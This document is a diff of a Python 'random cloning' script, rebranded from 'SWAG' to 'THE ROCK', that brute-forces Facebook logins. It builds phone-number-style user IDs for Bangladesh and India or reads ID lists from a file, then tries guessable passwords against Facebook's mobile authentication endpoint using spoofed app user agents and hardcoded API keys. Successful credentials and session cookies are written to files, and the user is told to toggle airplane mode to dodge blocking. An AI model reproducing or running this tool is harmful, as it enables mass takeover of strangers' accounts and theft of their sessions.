@@ -1,14 +1,14 @@
-#__________________[ IMPORT ]__________________#
 import os,zlib
 from os import system as osRUB
 from os import system as cmd
 os.system('clear')
-print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] LOADING MODULES ')
+print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] WELCOME THE ROCK ')
 try:
     import requests 
 except ImportError:
     print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING REQUESTS ')
     os.system('pip install requests')
+
 try:
     import concurrent.futures
 except ImportError:
@@ -28,8 +28,33 @@ from os import system as cmd
 from zlib import decompress 
 import os, platform
 from concurrent.futures import ThreadPoolExecutor
-fast_work = ThreadPoolExecutor(max_workers=15).submit
+fast_work = ThreadPoolExecutor(max_workers=10).submit
 #__________________[ LOOP ]__________________#
+dax=[]
+def methodx():
+    print("-"*30)
+    print("[1] Method ")
+    print("[2] Method ")
+    print("[3] Method ")
+    print("[4] Method ")
+    print("[5] Method ")
+    print("[6] Method ")
+    print("-"*30)
+    choi=input("Choice • ")
+    if choi in ["1"]:
+        dax.append("m")
+    elif choi in ['2']:
+        dax.append("mbasic")
+    elif choi in ['3']:
+        dax.append("p")
+    elif choi in ['4']:
+        dax.append("x")
+    elif choi in ['5']:
+        dax.append("free")
+    else:
+        dax.append("touch")
+
+
 totaldmp = 0
 count = 0
 loop = 0
@@ -47,7 +72,7 @@ filter = []
 loop,ok,cp,user = 0,[],[],[]
 cok,plist = [],[]
 #__________________[ SYS ]__________________#
-sys.stdout.write('\x1b]2; swag\x07')
+sys.stdout.write('\x1b]2; THE ROCK\x07')
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
 #__________________[ COLOUR ]__________________#
 A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
@@ -56,24 +81,28 @@ def clear():os.system('clear');print(logo)
 def linex():print(f'{A}──────────────────────────────────────────────────')
 #__________________[ LOGO ]__________________#
 logo =f"""{A}
-    {G1}   .dMMMb  dMP dMP dMP .aMMMb  .aMMMMP 
-    {G2}  dMP" VP dMP dMP dMP dMP"dMP dMP"     
-    {G3}  VMMMb  dMP dMP dMP dMMMMMP dMP MMP"  
-    {G4}dP .dMP dMP.dMP.dMP dMP dMP dMP.dMP    
-    {G5}VMMMP"  VMMMPVMMP" dMP dMP  VMMMP" {G1}[{A}V{G1}/{A}7.9{G1}]
+{G1}$$$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ 
+{G2}$$  __$$\ $$  __$$\ $$  __$$\ $$ | $$  |
+{G3}$$ |  $$ |$$ /  $$ |$$ /  \__|$$ |$$  / 
+{G4}$$$$$$$  |$$ |  $$ |$$ |      $$$$$  /  
+{G5}$$  __$$< $$ |  $$ |$$ |      $$  $$<   
+$$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  
+$$ |  $$ | $$$$$$  |\$$$$$$  |$$ | \$$\ 
+{G2}\__|  \__| \______/  \______/ \__|  \__| {G1}[VERSION-1]
+                                        
 {A}──────────────────────────────────────────────────
-{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} HABIB HOSSAIN
-{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} HABIB\_____:*\❷/3:)\⓿
-{G1}[{A}={G3}]{G3} TOOLTYPE {A}:{G3} FILE {A}&{G4} RANDOM CLONING
-{G1}[{A}={G4}]{G4} STATUS   {A}:{G4} SCRIPT SELL
+{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} THE ROCK
+{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} NOT 
+{G1}[{A}={G3}]{G3} TOOLTYPE {A}:{G3} FILE{A} X {G4}RANDOM
+{G1}[{A}={G4}]{G4} STATUS   {A}:{G4} PERSONAL
 {A}──────────────────────────────────────────────────"""
 #__________________[ RESULT ]__________________#
 def result(OKs,cps):
     if len(OKs) != 0 or len(cps) != 0:
         print(f'\r{A}──────────────────────────────────────────────────')
         print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETE...')
-        print(f'{G1}[{A}={G2}]{G2} TOTAL OK {A}:{G2} %s' % str(len(oks)))
-        print(f'{G1}[{A}={G2}]{G3} TOTAL CP {A}:{G3} %s' % str(len(cps)))
+        print(f'{G1}[{A}={G2}]{G2} TOTAL SUCCESS {A}:{G2} %s' % str(len(oks)))
+        print(f'{G1}[{A}={G2}]{G3} TOTAL CHECKPOINT {A}:{G3} %s' % str(len(cps)))
         print(f'\r{A}──────────────────────────────────────────────────')
         input(f"{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK MENU ")
         exit()
@@ -91,7 +120,7 @@ def menu():
     elif select =='2':
         _randm_()
     elif select =='3':
-        os.system('xdg-open https://www.facebook.com/sk.sahathat');menu()
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100022465476449');menu()
     elif select =='0':
         exit(f'{G1}[{A}={G1}]{G1} EXIT DONE ')
     else:
@@ -99,7 +128,8 @@ def menu():
         time.sleep(2)
         menu()
 #__________________[ RANDOM ]__________________#      
-def _randm_():   
+def _randm_():
+   
     clear()
     print(f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONING')
     print(f'{G1}[{A}2{G2}]{G2} INDIA CLONING')
@@ -119,6 +149,7 @@ def _randm_():
 #__________________[ BANGLADESH ]__________________#
 def _bd_():
     clear()
+    global dax
     print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} 017{A}/{G1}019{A}/{G1}018{A}/{G1}016');linex()
     code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
     name = ''.join(random.choice(string.digits) for _ in range(2))
@@ -129,16 +160,18 @@ def _bd_():
     for x in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
+        methodx()
     clear()
     with Habib(max_workers=30) as sexy:
         clear()
+        fb=dax[0]
         print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
         print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
         print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
         for love in user:
             ids = code+name+cod+love
             psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
-            sexy.submit(randm,ids,psd)
+            sexy.submit(randm,ids,psd,fb)
     print('')
     print(f'\r{A}──────────────────────────────────────────────────')
     print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
@@ -171,8 +204,8 @@ def _India_():
     print('')
     print(f'\r{A}──────────────────────────────────────────────────')
     print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
-    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
-    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
+    print(f'{G1}[{A}={G2}]{G2} TOTAL SUCCESS ID {A}:{G2} {str(len(ok))}')
+    print(f'{G1}[{A}={G3}]{G3} TOTAL CHECKPOINT ID {A}:{G3} {str(len(cp))}')
     print(f'\r{A}──────────────────────────────────────────────────')
     input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
     menu()
@@ -203,7 +236,7 @@ class main_crack():
     def crack(self,id):
         global methods
         clear()
-        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/SWAG.txt');linex()
+        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/ROCK.txt');linex()
         self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
         try:
             self.id = open(self.file).read().splitlines()
@@ -220,8 +253,8 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
-            sys.stdout.write(f"\r{G1}[{A}SAWG-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
+            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/Orca-Android;FBAV/65.0.0.4802;FBBV/4442782;FBCR/&amp;#160-;FBMF/samsung;FBBD/samsung;FBDV/SM-S134DL;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=1.875,width=720,height=1465};FB_FW/1;]"
+            sys.stdout.write(f"\r{G1}[{A}ROCK-METHOD-1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}SUCCESS{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -254,7 +287,7 @@ class main_crack():
                     "api_key": "882a8490361da98702bf97a021ddc14d"}
                 headers = {'User-Agent': ua,
                     'Content-Type': 'application/x-www-form-urlencoded',
-                    'Host': 'graph.facebook.com',
+                    'Host': 'b-graph.facebook.com',
                     'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                     'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                     'X-FB-Connection-Type': 'MOBILE.LTE',
@@ -270,13 +303,13 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
-                    print(f"\r\r{G1}[SWAG-OK] {sid} | {ps} ")
-                    open('/sdcard/SWAG-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    print(f"\r\r{G1}[ROCK-OK] {sid} | {ps} ")
+                    open('/sdcard/ROCK-M1-COOKIE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     print(f"\r\r{M}[SWAG-CP] {sid} | {ps} ")
-                     open('/sdcard/SWAG-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
+                     print(f"\r\r{M}[ROCK-CP] {sid} | {ps} ")
+                     open('/sdcard/ROCK-CP.txt','a').write(sid+'|'+ps+'\n')
                      cps.append(sid)
                 else:
                     continue
@@ -287,7 +320,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r{G1}[{A}SAWG-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
+            sys.stdout.write(f"\r{G1}[{A}ROCK-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -318,7 +351,7 @@ class main_crack():
                     "fb_api_req_friendly_name": "authenticate",
                     "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                     "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
+                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/279.0.0.43.120;FBBV/231020918;FBDM/{density=1.0,width=1600,height=800};FBLC/en_US;FBRV/257325639;FB_FW/2;FBCR/Bell;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.orca;FBDV/E"+"B2"+"101;FBSV/9.7.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]"',
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Host': 'graph.facebook.com',
                     'X-FB-Net-HNI': str(random.randint(20000, 40000)),
@@ -336,13 +369,13 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
-                    print(f"\r\r{G1}[SWAG-OK] {sid} | {ps} ")
-                    open('/sdcard/SWAG-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    print(f"\r\r{G1}ROCK-OK] {sid} | {ps} ")
+                    open('/sdcard/ROCK-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r\r{M}[SWAG-CP] {sid} | {ps} ")
-                    open('/sdcard/SWAG-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
+                    print(f"\r\r{M}[ROCK-CP] {sid} | {ps} ")
+                    open('/sdcard/ROCK-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                 else:
                     continue
@@ -370,7 +403,7 @@ class main_crack():
             print(f'{G1}[{A}={G2}]{G2} PASSWORD LIMIT {A}:{G1} {sl} ')
             print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
             linex()
-            with Habib(max_workers=30) as swagworld:
+            with Habib(max_workers=30) as rockworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -380,15 +413,15 @@ class main_crack():
                        else:
                             pwx =  pw
                             if 'methodA' in methods:
-                                swagworld.submit(self.methodA, uid, name, pwx)
+                                rockworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
-                                swagworld.submit(self.methodB, uid, name, pwx)
+                                rockworld.submit(self.methodB, uid, name, pwx)
                    except:pass
             result(oks,cps)
 #__________________[ RANDOM METHOD ]__________________#
-def randm(ids,psd):
+def randm(ids,psd,fb):
     global loop,ok,cp
-    sys.stdout.write(f"\r{G1}[{A}SAWG-XD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
+    sys.stdout.write(f"\r{G1}[{A}ROCK-XD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -413,7 +446,7 @@ def randm(ids,psd):
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
             'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            head={'User-Agent': '[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
+            head={'User-Agent': '[FBAN/FB4A;FBAV/359.0.0.30.118;FBBV/358614015;FBDM/{density=2.0,width=720,height=1436};FBLC/en_gb;FBRV/359080319;FBCR/banglalink;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1820;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
             'Content-Type':'application/x-www-form-urlencoded',
@@ -437,15 +470,16 @@ def randm(ids,psd):
             if 'access_token' in q:
                 uid = str(q['uid'])
                 coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                print(f'\r\r{G1}[SWAG-OK] {uid} | {pas}')
+                print(f'\r\r{G1}[ROCK-OK] {uid} | {pas}')
                 #print(f'\r\r{G1}[COOKIE]{A} {coki}')
-                open('/sdcard/TMT-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/ROCK-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 ok.append(uid)
                 break
             else:continue
         loop+=1
     except Exception as e:
         pass
-          
+        
+        
 menu()
 #__________________[ END ]__________________#
